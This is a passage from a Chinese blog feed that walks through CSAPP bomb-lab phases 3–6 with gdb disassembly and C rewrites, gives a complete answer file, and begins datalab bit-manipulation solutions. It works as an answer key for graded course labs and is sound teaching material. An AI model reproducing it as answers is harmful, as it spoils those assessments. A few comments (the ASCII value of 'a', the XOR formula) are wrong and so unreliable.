$0x137,%eax         ; 0x8(%rsp) = 1</span><br><span class="line"></span><br><span class="line">0x0000000000400fbe &lt;+123&gt;:cmp    0xc(%rsp),%eax      </span><br><span class="line">0x0000000000400fc2 &lt;+127&gt;:je     0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">0x0000000000400fc4 &lt;+129&gt;:call   0x40143a &lt;explode_bomb&gt;   ; 当第二个数和%eax不相等时爆炸</span><br><span class="line"></span><br><span class="line">0x0000000000400fc9 &lt;+134&gt;:add    $0x18,%rsp</span><br><span class="line">0x0000000000400fcd &lt;+138&gt;:ret    </span><br></pre></td></tr></table></figure></p><p>省流：第一个数应该在[0, 7]，确定了第一个数是哪个，就会对应一个数作为第二个数，因此可以有八种答案：</p><div class="table-container"><table><thead><tr><th style="text-align:center">第一个数</th><th style="text-align:center">第二个数</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">207</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">311</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">707</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">256</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">389</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">206</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">682</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center">327</td></tr></tbody></table></div><h2 id="4-phase-4"><a href="#4-phase-4" class="headerlink" title="4. phase_4"></a>4. phase_4</h2><p>我直接disas phase_4：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040100c &lt;+0&gt;:sub    $0x18,%rsp</span><br><span class="line">0x0000000000401010 &lt;+4&gt;:lea    0xc(%rsp),%rcx</span><br><span class="line">0x0000000000401015 &lt;+9&gt;:lea    0x8(%rsp),%rdx</span><br><span class="line">0x000000000040101a &lt;+14&gt;:mov    $0x4025cf,%esi   ；x/s 0x4025cf得&quot;%d %d&quot;</span><br><span class="line">0x000000000040101f &lt;+19&gt;:mov    $0x0,%eax</span><br><span class="line">0x0000000000401024 &lt;+24&gt;:call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">0x0000000000401029 &lt;+29&gt;:cmp    $0x2,%eax</span><br><span class="line">0x000000000040102c &lt;+32&gt;:jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line"></span><br><span class="line">0x000000000040102e &lt;+34&gt;:cmpl   $0xe,0x8(%rsp)</span><br><span class="line">0x0000000000401033 &lt;+39&gt;:jbe    0x40103a &lt;phase_4+46&gt;  ; 第一个数要小于等于0xe 十进制为14</span><br><span class="line">0x0000000000401035 &lt;+41&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line"></span><br><span class="line">0x000000000040103a &lt;+46&gt;:mov    $0xe,%edx        ; 14是第三参数</span><br><span class="line">0x000000000040103f &lt;+51&gt;:mov    $0x0,%esi        ; 0是第二个参数</span><br><span class="line">0x0000000000401044 &lt;+56&gt;:mov    0x8(%rsp),%edi   ; 第一个数是第一个参数</span><br><span class="line">0x0000000000401048 &lt;+60&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">0x000000000040104d &lt;+65&gt;:test   %eax,%eax</span><br><span class="line">0x000000000040104f &lt;+67&gt;:jne    0x401058 &lt;phase_4+76&gt;  ; 返回值需要等于0</span><br><span class="line">0x0000000000401051 &lt;+69&gt;:cmpl   $0x0,0xc(%rsp)         ; 第二个数需要等于0</span><br><span class="line">0x0000000000401056 &lt;+74&gt;:je     0x40105d &lt;phase_4+81&gt;  </span><br><span class="line">0x0000000000401058 &lt;+76&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line"></span><br><span class="line">0x000000000040105d &lt;+81&gt;:add    $0x18,%rsp</span><br><span class="line">0x0000000000401061 &lt;+85&gt;:ret   </span><br></pre></td></tr></table></figure><br>省流：要求输入两个十进制数，第二个数必须是0，第一个数丢进func4后返回的结果也必须是0</p><p>接下来看func4，我直接disas func4：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400fce &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">0x0000000000400fd2 &lt;+4&gt;:mov    %edx,%eax  </span><br><span class="line">0x0000000000400fd4 &lt;+6&gt;:sub    %esi,%eax  </span><br><span class="line">0x0000000000400fd6 &lt;+8&gt;:mov    %eax,%ecx  </span><br><span class="line">0x0000000000400fd8 &lt;+10&gt;:shr    $0x1f,%ecx </span><br><span class="line">0x0000000000400fdb &lt;+13&gt;:add    %ecx,%eax  </span><br><span class="line">0x0000000000400fdd &lt;+15&gt;:sar    %eax       </span><br><span class="line">0x0000000000400fdf &lt;+17&gt;:lea    (%rax,%rsi,1),%ecx </span><br><span class="line"></span><br><span class="line">0x0000000000400fe2 &lt;+20&gt;:cmp    %edi,%ecx</span><br><span class="line">0x0000000000400fe4 &lt;+22&gt;:jle    0x400ff2 &lt;func4+36&gt;</span><br><span class="line">0x0000000000400fe6 &lt;+24&gt;:lea    -0x1(%rcx),%edx  </span><br><span class="line"></span><br><span class="line">0x0000000000400fe9 &lt;+27&gt;:call   0x400fce &lt;func4&gt; </span><br><span class="line">0x0000000000400fee &lt;+32&gt;:add    %eax,%eax</span><br><span class="line">0x0000000000400ff0 &lt;+34&gt;:jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line"></span><br><span class="line">0x0000000000400ff2 &lt;+36&gt;:mov    $0x0,%eax</span><br><span class="line">0x0000000000400ff7 &lt;+41&gt;:cmp    %edi,%ecx</span><br><span class="line">0x0000000000400ff9 &lt;+43&gt;:jge    0x401007 &lt;func4+57&gt;</span><br><span class="line">0x0000000000400ffb &lt;+45&gt;:lea    0x1(%rcx),%esi</span><br><span class="line">0x0000000000400ffe &lt;+48&gt;:call   0x400fce &lt;func4&gt;</span><br><span class="line">0x0000000000401003 &lt;+53&gt;:lea    0x1(%rax,%rax,1),%eax</span><br><span class="line"></span><br><span class="line">0x0000000000401007 &lt;+57&gt;:add    $0x8,%rsp</span><br><span class="line">0x000000000040100b &lt;+61&gt;:ret    </span><br></pre></td></tr></table></figure><br>我根据几个比较和跳转的关系把它们分成了几段，可以看到好几处<strong>递归调用</strong>，为了方便看，把三个参数%edi，%esi，%edx记作a，b，c，把%eax和%ecx记作x，y，写成c语言的形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fun4</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b=<span class="number">0</span>, <span class="type">int</span> c=<span class="number">14</span>)</span>&#123;</span><br><span class="line">   <span class="comment">// a 是我们输入的第一个数</span></span><br><span class="line">   <span class="comment">// 以下注释仅针对第一轮进入函数体</span></span><br><span class="line">   <span class="type">int</span> x = c - b;             <span class="comment">// x=14</span></span><br><span class="line">   <span class="type">int</span> y = (x &gt;= <span class="number">0</span>)? <span class="number">0</span> : <span class="number">-1</span>;  <span class="comment">// y=0</span></span><br><span class="line"></span><br><span class="line">   x = (x + y) / <span class="number">2</span>;           <span class="comment">// x=7</span></span><br><span class="line">   y= x + b;                  <span class="comment">// y=7</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(y &lt;= a)&#123;                <span class="comment">// a &gt;= 7 的时候进入</span></span><br><span class="line">      x = <span class="number">0</span>                   <span class="comment">// x=0, 而我们正需要返回值是0</span></span><br><span class="line">      <span class="keyword">if</span>(y &gt;= a)&#123;             <span class="comment">// 所以只要让 a &lt;=7 即 a = 7就能返回0</span></span><br><span class="line">         <span class="keyword">return</span> x;            <span class="comment">// 所以令 a = 7就能通过  </span></span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         b = y + <span class="number">1</span>            <span class="comment">// a &gt; 7时会走到这里</span></span><br><span class="line">         x = func4(a, b, c);     </span><br><span class="line">         <span class="keyword">return</span> <span class="number">2</span> * x + <span class="number">1</span>;    <span class="comment">// 返回一个奇数，不可能为0，因此a &gt; 7必爆</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;                     <span class="comment">// a &lt; 7的时候</span></span><br><span class="line">      c = y - <span class="number">1</span>;              </span><br><span class="line">      x = func4(a, b, c);     <span class="comment">// func4(a, 0, 6)</span></span><br><span class="line">      <span class="comment">// 我们这一轮是func4(a, 0, 14), 输入7能过</span></span><br><span class="line">      <span class="comment">// 同理, 下一轮是func4(a, 0, 6), 输入3能过</span></span><br><span class="line">      <span class="comment">// 再下一轮的c = 6/2-1 = 2, 输入1能过</span></span><br><span class="line">      <span class="comment">// 再下一轮的c = 2/2-1 = 0, 输入0能过</span></span><br><span class="line">      <span class="comment">// 再下一轮的c = 0/2-1 = -1， 不会走到这里, 而是走到返回奇数那里, 必爆 </span></span><br><span class="line">      <span class="comment">// 综上, 第一个数可以取7, 3, 1, 0</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">2</span> * x;</span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过分析，第一个数可以取<strong>7或3或1或0</strong></p><p>其实在[0, 14]里面枚举也能暴力通过（小声</p><p>综上，答案共有四种，如下：</p><div class="table-container"><table><thead><tr><th style="text-align:center">第一个数</th><th style="text-align:center">第二个数</th></tr></thead><tbody><tr><td style="text-align:center">7</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">0</td><td style="text-align:center">0</td></tr></tbody></table></div><h2 id="5-phase-5"><a href="#5-phase-5" class="headerlink" title="5. phase_5"></a>5. phase_5</h2><p>二话不说对phase_5反汇编。</p><p>然后看看头：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401062 &lt;+0&gt;:push   %rbx</span><br><span class="line">0x0000000000401063 &lt;+1&gt;:sub    $0x20,%rsp</span><br><span class="line">0x0000000000401067 &lt;+5&gt;:mov    %rdi,%rbx                 ; %rbx = %rdi为我们输入的字符串</span><br><span class="line">0x000000000040106a &lt;+8&gt;:mov    %fs:0x28,%rax</span><br><span class="line">0x0000000000401073 &lt;+17&gt;:mov    %rax,0x18(%rsp)</span><br><span class="line">0x0000000000401078 &lt;+22&gt;:xor    %eax,%eax                 ; 设置canary</span><br></pre></td></tr></table></figure><br>设置canary是为了防止缓冲区溢出，看看就行，重点注意到%rbx保存了我们输入的字符串</p><p>再往下看<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040107a &lt;+24&gt;:call   0x40131b &lt;string_length&gt;</span><br><span class="line">0x000000000040107f &lt;+29&gt;:cmp    $0x6,%eax</span><br><span class="line">0x0000000000401082 &lt;+32&gt;:je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">0x0000000000401084 &lt;+34&gt;:call   0x40143a &lt;explode_bomb&gt;   ; 字符串长度不为6时爆炸</span><br><span class="line">0x0000000000401089 &lt;+39&gt;:jmp    0x4010d2 &lt;phase_5+112&gt;</span><br></pre></td></tr></table></figure><br>这里要求<strong>字符串长度等于6</strong>，然后跳转到phase_5+112，往下看<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004010d2 &lt;+112&gt;:mov    $0x0,%eax</span><br><span class="line">0x00000000004010d7 &lt;+117&gt;:jmp    0x40108b &lt;phase_5+41&gt;</span><br></pre></td></tr></table></figure><br>这里把%eax初始化为0，然后又跳转到phase_5+41，往上看<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040108b &lt;+41&gt;:movzbl (%rbx,%rax,1),%ecx        ; movzbl每次拷贝一个字节，%rbx是输入字符串   </span><br><span class="line"> 0x000000000040108f &lt;+45&gt;:mov    %cl,(%rsp)</span><br><span class="line"> 0x0000000000401092 &lt;+48&gt;:mov    (%rsp),%rdx               ; %rdx = %cl</span><br><span class="line"> 0x0000000000401096 &lt;+52&gt;:and    $0xf,%edx                 ; 只取最后四位, 比如a的ascii码为0x41, 就取1</span><br><span class="line"> 0x0000000000401099 &lt;+55&gt;:movzbl 0x4024b0(%rdx),%edx   </span><br><span class="line"> 0x00000000004010a0 &lt;+62&gt;:mov    %dl,0x10(%rsp,%rax,1)     </span><br><span class="line"> </span><br><span class="line"> ; (gdb) x/s 0x4024b0</span><br><span class="line"> ; 0x4024b0 &lt;array.3449&gt;:  &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br><span class="line"> ; 只用看前面16位字母 maduiersnfotvbyl</span><br><span class="line"> ; 以%dl为下标，取一个字符压入栈中</span><br><span class="line"></span><br><span class="line"> 0x00000000004010a4 &lt;+66&gt;:add    $0x1,%rax</span><br><span class="line"> 0x00000000004010a8 &lt;+70&gt;:cmp    $0x6,%rax</span><br><span class="line"> 0x00000000004010ac &lt;+74&gt;:jne    0x40108b &lt;phase_5+41&gt;     ; 循环条件, 共走六遍</span><br><span class="line"></span><br><span class="line"> 0x00000000004010ae &lt;+76&gt;:movb   $0x0,0x16(%rsp)           ; 字符&#x27;\0&#x27;压入栈中</span><br><span class="line"> 0x00000000004010b3 &lt;+81&gt;:mov    $0x40245e,%esi            ; x/s 0x40245e得&quot;flyers&quot;</span><br><span class="line"> 0x00000000004010b8 &lt;+86&gt;:lea    0x10(%rsp),%rdi</span><br><span class="line"> 0x00000000004010bd &lt;+91&gt;:call   0x401338 &lt;strings_not_equal&gt;</span><br><span class="line"> 0x00000000004010c2 &lt;+96&gt;:test   %eax,%eax</span><br><span class="line"> 0x00000000004010c4 &lt;+98&gt;:je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line"> 0x00000000004010c6 &lt;+100&gt;:call   0x40143a &lt;explode_bomb&gt;   ; 不等于这个字符串 -&gt; bomb! </span><br><span class="line"></span><br><span class="line"> ; 为了使压入栈中的字符串为flyers, 那么我们输入的字符串中的每个字符, 按十六进制的最后一位应该为：</span><br><span class="line"> ; 9fe567</span><br><span class="line"> ; 查询ASCII码表格就能组合出多种答案，如：ionefg, yonuvw</span><br></pre></td></tr></table></figure><br>省流：从phase_5+41到phase_5+74构成了一个循环，依次取出我们输入的字符串的每一个字符，用<strong>这个字符的编码值 mod 0x10作下标</strong>去取一个常量字符串”maduiersnfotvbyl”中的一个字符压入栈中，最后要求栈中<strong>字符串为”flyers”</strong></p><p>更直观地用c语言表述如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// input为我们输入的字符串, stack为栈, str为常量字符串</span><br><span class="line"></span><br><span class="line">cosnt char str[17] = &quot;maduiersnfotvbyl&quot;   // 其实后面还有字符但是不用管</span><br><span class="line">for(int i = 0; i != 6; ++i)&#123;</span><br><span class="line">   stack[i] = str[input[i] % 0x10];</span><br><span class="line">&#125;</span><br><span class="line">if(strcmp(stack, &quot;flyers&quot;))&#123;</span><br><span class="line">   // 如果stack中的字符串不等于&quot;flyers&quot;</span><br><span class="line">   explode_bomb();</span><br><span class="line">&#125;</span><br><span class="line">return ;</span><br></pre></td></tr></table></figure></p><p>查询ascii码对照表可以有多个答案，如：<br><strong>ionefg</strong><br><strong>yonuvw</strong><br><strong>9?&gt;%&amp;’</strong></p><h2 id="6-phase-6"><a href="#6-phase-6" class="headerlink" title="6. phase_6"></a>6. phase_6</h2><p>phase_6有些太复杂了。。。详细过程可以参考前言挂的b站视频</p><p>大概就是：</p><p>内存里有一条链表：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/24 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:       332     1       6304480 0</span><br><span class="line">0x6032e0 &lt;node2&gt;:       168     2       6304496 0</span><br><span class="line">0x6032f0 &lt;node3&gt;:       924     3       6304512 0</span><br><span class="line">0x603300 &lt;node4&gt;:       691     4       6304528 0</span><br><span class="line">0x603310 &lt;node5&gt;:       477     5       6304544 0</span><br><span class="line">0x603320 &lt;node6&gt;:       443     6       0       0</span><br></pre></td></tr></table></figure></p><p>然后你需要<strong>输入六个数字</strong>，<strong>根据这六个数字重新组合</strong>这条链表：<br>假设第一个数字为x，那么重组后的链表第一个节点为内存中链表的第7 - x个节点</p><p>然后遍历链表，当<strong>链表的值是降序</strong>时，可以通过，因此，节点应该是内存中第<br>3 4 5 6 1 2 个节点</p><p>故我们需要输入的数字为：<strong>4 3 2 1 6 5</strong></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>ans.txt如下能通过<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">7 327</span><br><span class="line">7 0</span><br><span class="line">9?&gt;%&amp;&#x27;</span><br><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Andrew:/mnt/d/.c/csapp/bomb# ./bomb ans.txt</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">Halfway there!</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">Congratulations! You&#x27;ve defused the bomb!</span><br></pre></td></tr></table></figure></p><p>磕磕绊绊总算都过了，有点可惜没能赶在龙年到来之前发出这篇题解（是谁除夕夜打lab啊</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CMU 15-213 CSAPP】详解lab1——datalab</title>
      <link href="/2024/02/05/%E3%80%90CMU%2015-213%20CSAPP%E3%80%91%E8%AF%A6%E8%A7%A3lab1%E2%80%94%E2%80%94datalab/"/>
      <url>/2024/02/05/%E3%80%90CMU%2015-213%20CSAPP%E3%80%91%E8%AF%A6%E8%A7%A3lab1%E2%80%94%E2%80%94datalab/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于开始学大名鼎鼎的CSAPP，一开始配环境就把我配得想退坑。。幸亏配好了</p><p>lab1真的很难想，实在想不出来就瞅眼别人的思路，然后又再嗯造自己的</p><p>所有注释都是作者一点一点想一点一点敲出来的喵</p><p>环境配置参考：<br><a href="https://blog.csdn.net/qq_40856284/article/details/122164149">CSAPP LAB —— 0. 实验环境搭建_何人听我楚狂声 csdn-CSDN博客</a></p><p>代码思路参考：<br><a href="https://zhuanlan.zhihu.com/p/59534845">CSAPP 之 DataLab详解，没有比这更详细的了 - 知乎 (zhihu.com)</a><br><a href="https://zhuanlan.zhihu.com/p/278569370">cSAPP lab1 datalab - 知乎 (zhihu.com)</a></p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><h2 id="1-bitXor"><a href="#1-bitXor" class="headerlink" title="1. bitXor"></a>1. bitXor</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">  <span class="comment">// 按位异或 即 (x &amp; y) | (~x &amp; ~y)</span></span><br><span class="line">  <span class="comment">// 由德摩根律</span></span><br><span class="line">  <span class="keyword">return</span> (~(x &amp; y)) &amp; (~(~x &amp; ~y)) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2. tmin"></a>2. tmin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// int 占 4 bite即 32 bit</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-isTmax"><a href="#3-isTmax" class="headerlink" title="3. isTmax"></a>3. isTmax</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="comment">// 当x = 0111 1111时，令y = ~x = 1000 0000，则有 2y = 0</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 但是, 令2y = 0，得y = 1000 0000 或 0000 0000</span></span><br><span class="line">  <span class="comment">// 1000 0000对应的x为 0111 1111，0000 0000对应的x为1111 1111</span></span><br><span class="line">  <span class="comment">// 即，当x = 1111 1111 时，y = 0000 0000，也有 2y = 0</span></span><br><span class="line">  <span class="comment">// 因此需要构造条件过滤x = 1111 1111 的情况</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 令z = !y，当x = 0111 1111时，z = 0, 当x = 1111 1111时，z = 1</span></span><br><span class="line">  <span class="comment">// 因此只有当x = 0111 1111时，才有2y + z = 0</span></span><br><span class="line">  <span class="type">int</span> y = ~x; </span><br><span class="line">  <span class="type">int</span> z = !y; </span><br><span class="line">  <span class="keyword">return</span> !(y + y + z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-allOddBits"><a href="#4-allOddBits" class="headerlink" title="4. allOddBits"></a>4. allOddBits</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="comment">// 0x55 = 0101 0101 所有偶数位为1</span></span><br><span class="line">  <span class="comment">// x | 0x55555555 中偶数位全为1，</span></span><br><span class="line">  <span class="comment">// 那么，当且仅当x的奇数位全为1时，结果为0xffffffff</span></span><br><span class="line">  <span class="comment">// 对0xffffffff按位取反得0，再取反得到真</span></span><br><span class="line">  <span class="type">int</span> temp = <span class="number">0x55</span>;</span><br><span class="line">  temp = temp + (temp &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  temp = temp + (temp &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> !~(x | temp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 0x55555555 其实也是 ~(0xAAAAAAAA)，按照德摩根律</span></span><br><span class="line">  <span class="comment">// return !(~x &amp; 0xAAAAAAAA);</span></span><br><span class="line">  <span class="comment">// 这种写法也是正确的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-negate"><a href="#5-negate" class="headerlink" 